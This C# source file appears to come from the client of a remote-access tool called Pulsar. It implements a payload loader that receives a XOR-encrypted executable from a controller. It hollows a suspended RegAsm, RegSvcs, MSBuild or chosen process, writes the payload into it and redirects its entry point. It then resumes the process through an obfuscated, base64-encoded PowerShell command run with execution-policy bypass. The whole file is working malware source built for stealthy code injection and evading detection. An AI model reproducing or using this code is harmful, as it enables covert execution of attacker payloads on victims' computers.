
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
namespace Pulsar.Client.Messages
{
    public static class RunPE
    {





        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, int[] lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr thread, int[] context);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);



        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);







        #region Structure
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion

        [DllImport("ntdll.dll")]
        private static extern int NtWriteVirtualMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten);
        public static string Execute(string path, byte[] payload)
        {

            int readWrite = 0x0;
            StartupInformation si = new StartupInformation();
            ProcessInformation pi = new ProcessInformation();
            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
                    int[] context = new int[0xB3];
                    context[0x0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    else
                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    int ebx = context[0x29];
                    int baseAddress = 0x0;
                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite)) throw new Exception();
                    if (imageBase == baseAddress)
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0) throw new Exception();
                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);

                    if (newImageBase == 0x0) throw new Exception();
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
                    for (int I = 0; I < numberOfSections; I++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);
                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                        }
                        sectionOffset += 0x28;
                    }
                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite)) throw new Exception();
                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
                    if (allowOverride) newImageBase = imageBase;
                    context[0x2C] = newImageBase + addressOfEntryPoint;


            if (IntPtr.Size == 4)
            {
                if (NtWriteVirtualMemory(pi.ProcessHandle, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) < 0) throw new Exception();
                Marshal.WriteInt32(context, 0xb0, (int)imageBase + addressOfEntryPoint);
            }
            else
            {
                IntPtr rdx = (IntPtr)Marshal.ReadInt64(context, 0x88);
                if (NtWriteVirtualMemory(pi.ProcessHandle, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) < 0) throw new Exception();
                Marshal.WriteInt64(context, 0x80, (long)imageBase + addressOfEntryPoint);
            }





            int pid = (int)pi.ProcessId;
            string contextString = string.Join(",", context);
            return $"{pid}|{pi.ThreadHandle}|{contextString}";
        }
    }






    public class PayloadLoaderHandler : IMessageProcessor
    {



        public bool CanExecute(IMessage message) => message is DoSendPayload;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoSendPayload msg:
                    Execute(sender, msg);
                    break;
            }
        }
        static byte[] XorEncryptDecrypt(byte[] data, byte[] key)
        {
            byte[] output = new byte[data.Length];
            int keyLength = key.Length;

            for (int i = 0; i < data.Length; i++)
            {
                output[i] = (byte)(data[i] ^ key[i % keyLength]);
            }

            return output;
        }
















        public static class Demo
        {
            internal static string RandomString(int length, Random rng)
            {
                string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
            }




            public static void Crate(int pid, IntPtr threadhandle, int[] context)
            {
                Random rng = new Random();
                string varName = RandomString(rng.Next(10, 20), rng);
                string obfMarker = RandomString(rng.Next(50, 151), rng);

                string script = $@"
AReplaceThisObfMarkerdd-ReplaceThisObfMarkerType -TypeDefReplaceThisObfMarkerinition @'
usiReplaceThisObfMarkerng SyReplaceThisObfMarkerstem;
usReplaceThisObfMarkering SyReplaceThisObfMarkerstem.Diagnostics;
usiReplaceThisObfMarkerng System.RuntReplaceThisObfMarkerime.InteropServices;

pubReplaceThisObfMarkerlic clReplaceThisObfMarkerass ThreadReplaceThisObfMarkerResumer
{{
    [FlaReplaceThisObfMarkergs]
    priReplaceThisObfMarkervate enum ThreadAcReplaceThisObfMarkercess : iReplaceThisObfMarkernt
    {{
        SUSPEReplaceThisObfMarkerND_RESUME = 0ReplaceThisObfMarkerx0002
    }}

    [DllImport(""kernel32.dll"", SetLastError = true)]
    private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandlReplaceThisObfMarkere, uint dwThreadId);

    [DllImpReplaceThisObfMarkerort(""kerneReplaceThisObfMarkerl32.dll"", SetLastError = true)]
    private static extern uint ResumeThread(IntReplaceThisObfMarkerPtr hThReplaceThisObfMarkerread);

    [DllImport(""kernel32.dll"", SetLastError = truReplaceThisObfMarkere)]
    private static extern ReplaceThisObfMarkerbooReplaceThisObfMarkerl CloseHandReplaceThisObfMarkerle(IntPtr hObject);



        [DllImport(""kernel32.dll"")]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [DllImport(""kernel32.dll"", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, int[] lpContext);



    public static int ResumeProcess(int processId)
    {{
        int resumed = 0;
        Process p = Process.GetProcessById(processId);







        foreach (ProcessThread t in p.Threads)
        {{
            IntPtr h = OpenThread(ThreadAccess.SUSPEND_RESUME, falReplaceThisObfMarkerse, (uiReplaceThisObfMarkernt)t.IReplaceThisObfMarkerd);
            if (h == IntPtrReplaceThisObfMarker.Zero) contReplaceThisObfMarkerinue;
            try
            {{
                uint prev = ResumReplaceThisObfMarkereReplaceThisObfMarkerThread(h);
                if (prev != 0xFFFFFReplaceThisObfMarkerFFF) reReplaceThisObfMarkersumed++;
            }}
            finally {{ CloseHReplaceThisObfMarkerandle(h); }}
        }}
        retReplaceThisObfMarkerurn reReplaceThisObfMarkersumed;
    }}
}}
'@

[int]$pid = {pid}
$reReplaceThisObfMarkersumReplaceThisObfMarkered = [ThreadReplaceThisObfMarkerResumer]::ResumePReplaceThisObfMarkerrocess($pReplaceThisObfMarkerid)
";






                string powershellScript = script
                    .Replace("`", "``")
                    .Replace("\"", "`\"")
                    .Replace("$", "`$");

                StringBuilder sb = new StringBuilder();
                sb.AppendFormat("${0}=\"{1}\";", varName, powershellScript);
                sb.AppendLine();
                sb.AppendFormat("${0}=${0} -replace '{1}','';", varName, obfMarker);
                sb.AppendLine();
                sb.AppendFormat("iex ${0}", varName);
                sb.AppendLine();

                string full = sb.ToString();

                full = full.Replace("ReplaceThisObfMarker", obfMarker);

           

                string base64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(full));

                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -ep bypass -ec {base64}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = System.Diagnostics.Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                  

                    if (!string.IsNullOrEmpty(error))
                    {
                       
                    }
                }


            }
        }


















        private void Execute(ISender client, DoSendPayload msg)
        {
            try
            {


            
                if (msg.Extension == "RunPE")
                {
                    if (msg.Path == "a")
                    {
                     string xd =    RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"), XorEncryptDecrypt(msg.Payload, Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")));

                        string[] parts = xd.Split('|');
                        int pid = int.Parse(parts[0]);
                        IntPtr threadHandle = (IntPtr)long.Parse(parts[1]);
                        int[] context = Array.ConvertAll(parts[2].Split(','), int.Parse);


                        Thread.Sleep(2000);


                        Demo.Crate(pid,threadHandle,context);



                    }
                    if (msg.Path == "b")
                    {

                        string xd = RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegSvcs.exe"), XorEncryptDecrypt(msg.Payload, Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")));
                        string[] parts = xd.Split('|');

                        int pid = int.Parse(parts[0]);
                        IntPtr threadHandle = (IntPtr)long.Parse(parts[1]);
                        int[] context = Array.ConvertAll(parts[2].Split(','), int.Parse);
                        Thread.Sleep(2000);

                        Demo.Crate(pid, threadHandle, context);


                    }
                    if (msg.Path == "c")
                    {


                        string xd = RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "MSBuild.exe"), XorEncryptDecrypt(msg.Payload, Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")));
                        string[] parts = xd.Split('|');

                        int pid = int.Parse(parts[0]);
                        IntPtr threadHandle = (IntPtr)long.Parse(parts[1]);
                        int[] context = Array.ConvertAll(parts[2].Split(','), int.Parse);
                        Thread.Sleep(2000);

                        Demo.Crate(pid, threadHandle, context);

                    }


                    if (msg.Path == "d")
                    {


                        string xd = RunPE.Execute(msg.Paths, XorEncryptDecrypt(msg.Payload, Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")));

                        string[] parts = xd.Split('|');
                        int pid = int.Parse(parts[0]);
                        IntPtr threadHandle = (IntPtr)long.Parse(parts[1]);
                        int[] context = Array.ConvertAll(parts[2].Split(','), int.Parse);


                        Thread.Sleep(2000);

                        Demo.Crate(pid, threadHandle, context);

                    }


                }



            }
            catch (Exception ex)
            {
            }
        }
    }
}
